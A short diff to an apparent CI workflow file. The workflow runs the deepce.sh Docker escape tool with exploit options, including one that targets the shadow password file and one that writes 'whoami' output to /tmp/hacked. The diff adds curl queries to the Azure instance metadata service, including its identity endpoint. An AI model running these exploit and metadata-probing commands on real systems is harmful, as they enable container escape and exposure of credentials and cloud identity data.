@@ -28,4 +28,13 @@ jobs:
             ./deepce.sh --no-enumeration --exploit SOCK --shadow; \
             ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
       - run: |
+            curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq; \
+            curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity?api-version=2021-02-01" | jq; \
+            curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/versions?api-version=2021-02-01" | jq; \
             curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
+
+
+
+
+            
+       
